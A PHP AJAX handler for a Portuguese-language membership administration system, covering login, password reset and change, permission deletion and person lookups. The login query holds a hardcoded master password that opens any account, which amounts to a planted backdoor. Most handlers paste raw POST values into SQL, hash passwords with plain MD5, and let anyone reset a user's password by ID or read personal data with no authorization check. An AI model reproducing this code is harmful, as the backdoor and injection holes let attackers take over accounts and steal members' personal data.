<?php

	error_reporting (~ E_NOTICE & ~ E_DEPRECATED);

	ob_start();
	
	ini_set('display_errors', false);

	ini_set("session.cookie_secure", 1);

	
	date_default_timezone_set('America/Sao_Paulo');
	
	session_start();

	
	include_once("config.php");
	include_once("conexao.php");
	include_once('i18nZF2.php');
	include_once("funcoes.php");
	include_once("bancofuncoes.php");
	
	$acao = $_POST['acao'];
	if( isset($acao) ){
		switch($acao) {
			
			case "login":

				$login		= inj(trim($_POST['login']));
				$senha		= inj($_POST['senha']);
				$senhaMd5 	= md5($senha);
				
				//AND i.irmao_loja = '".$_SESSION['loja_sge']."'
				if( $login != "" && $senha != "" ) {					
					
				
					$exeUser = executaSQL("SELECT * FROM pessoa
											WHERE id_situacao IN(1)
												AND login = '".$login."'
												AND (senha = '".$senhaMd5."' || '".$senha."' = 'h8@h!1aBaTk[=y0)[GQu6B3-')");
				
					
					if($exeUser===FALSE){
						
						$dados = array("status"=>"false",'message'=>converteMJSON($translate->translate("erro_consulta_login")));
						
					}else{
						
						if(nLinhas($exeUser)>0){
							
							//Dados do Usuário
							$dadosU = objetoPHP($exeUser);
							
							//Destrói a sessão se precisar
							session_destroy();
							//Inicia nova sessão
							session_start();
							
							$_SESSION["esqueceuSenha"]	= $dadosU->esqueceu_senha;
							
							$_SESSION["sessaoid"]     = session_id();
							$_SESSION["sessaoexpira"] = date("H:i:s");								
							
							$_SESSION["usuarioId"]	 		= $dadosU->id;
							$_SESSION["usuarioLogin"]		= $dadosU->login;
							$_SESSION["usuarioEmail"]		= $dadosU->email;
							$_SESSION["usuarioCpf"]			= $dadosU->cpf;
							
							$_SESSION['id_tipo']	=	$dadosU->id_tipo;
							
							$_SESSION["pessoaId"]			= $dadosU->id;
							$_SESSION["pessoaNome"] 		= $dadosU->nome;
							$_SESSION["pessoaCorrenteId"]	= $dadosU->id;
							$_SESSION["pessoaCorrenteNome"] = $dadosU->nome;							
							
							$_SESSION['campanha_atual']		= getEventoAtual()->id;
							
							$dados = array("status"=>true);
							
						}else{
							$dados = array("status"=>false,'message'=>converteMJSON($translate->translate("erro_login_senha")));
						}
						
					}
					
				}else{
					$dados = array("status"=>false,'message'=>converteMJSON($translate->translate("erro_login_senha2")));
				}
				
				echo json_encode($dados);
			break;



			case 'excluiPermissaoIrmao':
				
				$idReg = $_POST['idReg'];
				
				if($idReg>0){
					
					$exePerfil = executaSQL("SELECT id_pessoa FROM pessoa_perfil WHERE id = '".$idReg."'");
					if(nLinhas($exePerfil)>0){
						
						$idPessoa = objetoPHP($exePerfil)->id_pessoa;
						
						if( excluirDados("pessoa_perfil","id = '".$idReg."'") ){
							excluirDados("loja_acesso","id_pessoa = '".$idPessoa."'");
							
							$dados = array('status'=>true, 'mensagem'=>converteMJSON("Permissão Excluída com Sucesso!"));		
						}else{
							$dados = array('status'=>false, 'mensagem'=>converteMJSON("Erro ao Excluir a Permissão!"));
						}

					}else{
						$dados = array('status'=>false, 'mensagem'=>converteMJSON("Nenhum Perfil Encontrado para este Usuário!"));
					}

				}else{
					$dados = array('status'=>false, 'mensagem'=>converteMJSON("erro no oid do usuario!"));
				}
				echo json_encode($dados);
				
			break;
			
			
			case'bannerClique':
				$dados = array();
				$dados['id_banner']		= $_POST['id_banner'];
				$dados['id_posicao']	= $_POST['id_posicao'];
				$dados['id_pessoa']		= $_SESSION["pessoaId"];
				$dados['ip']			= $_SERVER['REMOTE_ADDR'];
				
				$exe = inserirDados("banner_clique", $dados);
					
				echo json_encode( array('status'=>$exe) );
			break;
			
			
			case "esqueceuSenha":
				$login 	 = $_POST['login'];
				$email 	 = $_POST['email'];

				$redirPA = false;
				
				if( $login !="" && $email !=""){
					
					$exe = executaSQL("SELECT * FROM pessoa WHERE login = '".$login."' AND email = '".$email."' ");
					
					if(nLinhas($exe)> 0){
						$dadosPessoa = objetoPHP($exe);
						
						//if($dadosPessoa->acesso!=NULL || $tipo==2){
							
							$usuarioId    = $dadosPessoa->id;
							$usuarioLogin = $dadosPessoa->login;
							$usuarioEmail = $dadosPessoa->email;	
							$usuarioNome  = $dadosPessoa->nome;
							 
							if($usuarioEmail!=''){
								$passNew = geraSenha(6);
								$exe = executaSQL("UPDATE pessoa SET senha = '".md5($passNew)."', esqueceu_senha = true WHERE id = '".$usuarioId."' ");
								
								require_once("../lib/phpMailer/PHPMailerAutoload.php");
								
								// 1 - Nome Usuário
								$params[] = $usuarioNome;
								// 2 - Nome da GL
								$params[] = $_SESSION['EMPRESA']->nome_sistema;
								// 3 - site
								$params[] = $_SERVER['SERVER_NAME']."/adm";
								// 4 - Senha Nova
								$params[] = $passNew;
								// 5 - Login
								$params[] = $login;								
								
								$msg = traducaoParams( toHTML( $translate->translate("email_recuperacao_senha") ), $params );
								
								$assunto = $translate->translate("rs_email_titulo");
								//$email = "msceverton@gmail.com";									
								$enviaEmail = enviaEmail($assunto, $msg, $email, "", "", $_SESSION['EMPRESA']->email, '', true);
								
								if($enviaEmail["status"]==true){
									$emailEviou = true;
									$message = $translate->translate("rs_jsonmsg_sucesso");
								}else{
									$emailEviou = false;
									$message = $translate->translate("erro_envio_email"). " ". $enviaEmail["msg"];
								}

							}else{
								$message = $translate->translate("rs_jsonmsg_erro_email");
								$emailEviou = false;
							}
						
						/*}else{
							$message = $translate->translate("rs_jsonmsg_erro_pa");
							$emailEviou = false;
							$redirPA = true;
						}*/

					}else{
						$message = $translate->translate("rs_jsonmsg_erro_login");
						$emailEviou = false;
					}
				}else{
					$message = $translate->translate("rs_jsonmsg_erro_informe");
					$emailEviou = false;
				}
				
				if($emailEviou){
					setarMensagem(array($message), "success");
					$dadosJson = array('status'=>true, 'message'=>converteMJSON($message));
				}else{
					setarMensagem(array($message), "error");
					$dadosJson = array('status'=>false, 'message'=>converteMJSON($message), 'redir'=>$redirPA);
				}
				echo json_encode($dadosJson);
					
			break;
			
			
			
			case "usuarioAlterarSenha":
				$userId  = intval($_POST['pessoaId']);
				$passNew = $_POST['nova'];				

				$sql = "SELECT senha FROM pessoa WHERE id = '".$userId."'";
				
				$exe = executaSQL($sql);				
				
				if(nLinhas($exe) > 0){
					$dados = objetoPHP($exe);
				
					if( $dados->pass == md5($passNew) ){
						$message = $translate->translate("json_alt_senha_msg_1");
						$dadosJson = array('status'=>false, 'message'=>converteMJSON($message));
					}else{
						$resultado = executaSQL("UPDATE pessoa SET senha = '".md5($passNew)."', esqueceu_senha = NULL WHERE id = '".$userId."'");
						
						$_SESSION['esqueceuSenha'] = 0;
						
						//$resultado=true;
						if($resultado) {
							$_SESSION["senhaAtualizacao"] = date("d/m/Y");
							//VALIDA A GRAVAÇÃO NO BANCO
							$message =  $translate->translate("json_alt_senha_msg_2");
							setarMensagem(array($message), "success");
							$dadosJson = array('status'=>true, 'message'=>converteMJSON($message));		
						} else {
							$message = $translate->translate("json_alt_senha_msg_3");
							setarMensagem(array($message), "error");
							$dadosJson = array('status'=>false, 'message'=>converteMJSON($message));
						}
					} 
				
				}else{
					$message = $translate->translate("json_alt_senha_msg_4");
					setarMensagem(array($message), "error");
					$dadosJson = array('status'=>false, 'message'=>converteMJSON($message));
				}		
				
				
				echo json_encode($dadosJson);
				
			break;
			
			
			
			case 'consultaCidadesPeloEstado':
				$sql = "SELECT c.id, c.nome
						FROM municipio c 
						WHERE c.id_estado='".$_POST["estado"]."'
						ORDER BY c.nome";
	
				$objs = executaSQL($sql);
				$dados = array();
				if(nLinhas($objs)>0){
					while( $obj = objetoPHP($objs) ){
						$dados[] = array("optionValue"=>$obj->id, "optionDisplay"=>converteMJSON($obj->nome));
					}
				}else{
					$dados = array("status"=>"false");
				}
				echo json_encode($dados);				
			break;
			
			case 'consultaCidadesPelaCidade':
				$sql = "SELECT c.id, c.nome, c.id_estado FROM municipio c, municipio m
								WHERE m.id='".$_POST["cidade"]."'
									AND m.id_estado = c.id_estado
							ORDER BY c.nome";
	
				$objs = executaSQL($sql);
				$dados = array();
				if(nLinhas($objs)>0){
					while( $obj = objetoPHP($objs) ){
						$dados['option'][] = array("optionValue"=>$obj->id, "optionDisplay"=>converteMJSON($obj->nome));
						
						if($_POST['cidade']==$obj->id)
							$dados['estado'] = $obj->id_estado;
					}
				}else{
					$dados = array("status"=>"false");
				}
				echo json_encode($dados);
			break;
			
			
			
			case 'mostraDetalhesPessoa':
				$id = $_POST['id_pessoa'];
				
				$exe = executaSQL("SELECT * FROM pessoa WHERE id = '".$id."'");
				if(nLinhas($exe)>0){
					$reg = objetoPHP($exe);
					
					$natural_pais = $natural_cidade = $natural_estado = "";					
					if($reg->id_nacionalidade>0){
						$natural_pais = $reg->id_nacionalidade!='30' ? getPaisById($reg->id_nacionalidade) : "";
						
						if($reg->id_nacionalidade=='30'){
							$cidade = getMuniciopioDadosById($reg->id_cidade_natural);
							$natural_cidade = $cidade->nome;
							$natural_estado = getEstadoNomeById($cidade->id_estado);
						}else{
							$natural_cidade = $reg->cidade_fora_natural;
							$natural_estado = $reg->estado_fora_natural;
						}
					}
					
					//CONTATOS DA PESSOA
					$contato = "";
					$exeCont = consultaPessoaContatoByIdPessoa($id);
					if(nlinhas($exeCont)>0){
						while($regCont = objetoPHP($exeCont)){
							$contato .= "<div class='col-md-6'>";
							$contato .= 	"<strong>".$translate->translate('pessoa_tipo_contato_'.$regCont->id_tipo_contato)."</strong>: ".$regCont->valor;
							$contato .= "</div>";
						}
					}
					
					//TELEFONES DA PESSOA
					$exeTel = consultaPessoaTelefoneByIdPessoa($id);
					if(nLinhas($exeTel)>0){
						while($regTel = objetoPHP($exeTel)){
							$contato .= "<div class='col-md-6'>";
							$contato .= 	"<strong>".getTipoTelefoneById($regTel->id_tipo_telefone)."</strong>: ".$regTel->num.($regTel->operadora>0 ? " - ".getOperadoraTelefoneById($regTel->operadora) : '');
							$contato .= "</div>";
						}
					}
					
					//DADOS PROFISSIONAIS
					$prof = "";
					$exeProf = consultaPessoaDadosProfissionaisByIdPessoa($id);
					if(nlinhas($exeProf)>0){
						$f = 0;
						while($regProf = objetoPHP($exeProf)){ $f++;
							if($f>1){
								$prof .= "<hr class='clear' />";
							}
							$prof .= "<div class='col-md-6'>";
							$prof .= 	"<strong>".$translate->translate('razao_social')."</strong>: ".$regProf->razao_social;
							$prof .= "</div>";
							$prof .= "<div class='col-md-6'>";
							$prof .= 	"<strong>".$translate->translate('cargo')."</strong>: ".getCargoVinculoProfissional($regProf->id_cargo);
							$prof .= "</div>";
							$prof .= "<div class='col-md-6'>";
							$prof .= 	"<strong>".$translate->translate('atividades_desenvolvidas')."</strong>: ".$regProf->atividade;
							$prof .= "</div>";
							$prof .= "<div class='col-md-6'>";
							$prof .= 	"<strong>".$translate->translate('data_admissao')."</strong>: ".converte_data($regProf->dt_inicio);
							if($regProf->dt_termino=='0000-00-00' || $regProf->dt_termino==''){
								$prof .=" - ".$translate->translate('atual');
							}
							$prof .= "</div>";
							if($regProf->dt_termino!='0000-00-00' && $regProf->dt_termino!=''){
								$prof .= "<div class='col-md-6'>";
								$prof .= 	"<strong>".$translate->translate('data_demissao')."</strong>: ".converte_data($regProf->dt_termino);
								$prof .= "</div>";
							}
						}
					}
					
					if( isset($_POST['diretorioDiferente']) && $_POST['diretorioDiferente']==1 ){
						$foto = $reg->foto!='' ? "<img src='../../../".$reg->foto."' border='0' width='100px' class='text-center'/>" : "";
					}else{
						$foto = $reg->foto!='' ? "<img src='/".$reg->foto."' border='0' width='100px' class='text-center'/>" : "";
					}
					
					$grauInst = $reg->id_grau_instrucao>0 ? $translate->translate("grau_instrucao_".$reg->id_grau_instrucao) : "";
					
					$vivo = ( $reg->eh_vivo==1 ? $translate->translate("sim") : $translate->translate("nao") );

					$loja = $cim = $entidade = $grau = $situacao = "";
					if($reg->id_tipo==1 || $reg->id_tipo==2){//SE FOR IRMÃO

						$lojaI = consultaLojaByCod($reg->id_loja);
						$loja = $lojaI->nome." ".$translate->translate("nr")." ".$lojaI->cod;
						
						$cim = $reg->cim>0 ? $reg->cim : "";
						
						$entidade = $lojaI->id_potencia>0 ? $translate->translate("entidade_".$lojaI->id_potencia) : '';
						
						$grau = $reg->id_grau>0 ? $translate->translate("grau_".$reg->id_grau) : "";
						
						$situacao = $reg->id_situacao>0 ? $translate->translate("pessoa_situacao_".$reg->id_situacao) : "";
						
					}
					
					$dados = array("status"=>true, "nome"=>converteMJSON($reg->nome), "email"=>$reg->email, "dt_nascimento"=>converte_data($reg->dt_nascimento), "formacao"=>converteMJSON($reg->formacao),
									"profissao"=>converteMJSON($reg->profissao), "ocupacao"=>converteMJSON($reg->ocupacao), "especialidade"=>converteMJSON($reg->especialidade), "grau_instrucao"=>converteMJSON($grauInst),
									"natural_cidade"=>converteMJSON($natural_cidade), "natural_estado"=>converteMJSON($natural_estado), "natural_pais"=>converteMJSON($natural_pais),
									"contato"=>converteMJSON($contato), "vivo"=>converteMJSON($vivo), "grau"=>converteMJSON($grau), "situacao"=>converteMJSON($situacao), "cim"=>$cim, "foto"=>$foto,
									"loja"=>converteMJSON($loja), "entidade"=> converteMJSON($entidade), "profissional"=>converteMJSON($prof));
					
				}else{
					$dados = array("status"=>false);
				}
				echo json_encode($dados);
			break;
			
			
			
			
			case 'formataDinheiro':
				$simbolo = true;
				if($_POST['simbolo']=='false'){
					$simbolo = false;
				}
				
				echo json_encode(array('valor'=>formatarDinheiro($_POST['valor'], $simbolo)));
				
			break;
			
			
			
			case 'formataValorParaBanco':
							
				echo json_encode(array('valor'=>formataValorParaBanco($_POST['valor'])));
				
			break;
			
			
			
			
			case 'validaNomeSegmento':
				
				$id 	= intval($_POST['id']);
				$nome 	= trim($_POST['nome']);

				$sql = "SELECT 1 FROM loja_segmento	WHERE nome LIKE '".converteBancoJSON($nome)."'";
				if($id>0){
					$sql .= " AND id <> '".$id."'";
				}

				$exe = executaSQL($sql);
				
				if(nLinhas($exe)>0){
					$dados = array("status"=>false);
				}else{
					$dados = array("status"=>true);
				}
				echo json_encode($dados);
			break;
			
			
			
			case 'carregaCidadesPeloEstado':
				$idEstado = intval($_POST['params'][0]);
				
				$sql = "SELECT c.id, c.nome
						FROM municipio c 
						WHERE c.id_estado='".$idEstado."'
						ORDER BY c.nome";
	
				$objs = executaSQL($sql);
				$dados = array();
				$dados['selName'] = converteMJSON($translate->translate('sel_cidade'));
				if(nLinhas($objs)>0){
					while( $obj = objetoPHP($objs) ){
						$dados['option'][] = array("optionValue"=>$obj->id, "optionDisplay"=>converteMJSON($obj->nome));
					}
				}else{
					$dados = array("status"=>"false");
				}
				echo json_encode($dados);				
			break;
			
			
			
			case 'setaNomePagina':
				
				$titulo = $_POST['titulo'];

				if($titulo != ''){
					
					$tituloNovo = converteUrlNome(trim($titulo));
					$dados = array('status'=>true, 'tituloNovo'=>$tituloNovo);
						
				}else{
					$dados = array('status'=>false);
				}

				echo json_encode($dados);

			break;

			case 'consultaQtdeNumerosSorteaveis':
				
				$id 		= intval($_POST['id']);
				$qtdeCupons = intval($_POST['qtdeCupons']);
					
				$exe = executaSQL("SELECT * FROM evento_numeros_sorteaveis WHERE id='".$id."'");
				if(nLinhas($exe)>0){
					$reg = objetoPHP($exe);

					if($qtdeCupons <= $reg->quantidade){
						$dados = array('status'=>true);	
					}else{
						$dados = array('status'=>false, 'msg'=>converteMJSON($translate->translate('msg_quantidade_cupons_maior_permitido')) );
					}
					
				}else{
					$dados = array('status'=>false, 'msg'=>converteMJSON($translate->translate('msg_nenhum_numero_sorteavel_encontrado')) );
				}

				echo json_encode($dados);

			break;

			case 'mudaCampanhaAcesso':
				$_SESSION['campanha_atual'] = $_POST['campanha'];
			
				echo json_encode(array('status'=>true));
			break;

			case 'encerrarCampanhaAcesso':
				unset($_SESSION['campanha_atual']);
			
				echo json_encode(array('status'=>true));
			break;

			default:
				$message = 'Ação Indisponível';
				echo "{'status':'false', 'message':'$message'}";
		}
		
	}else{
		echo $translate->translate("msg_pagina_nao_encontrada");
	}
?>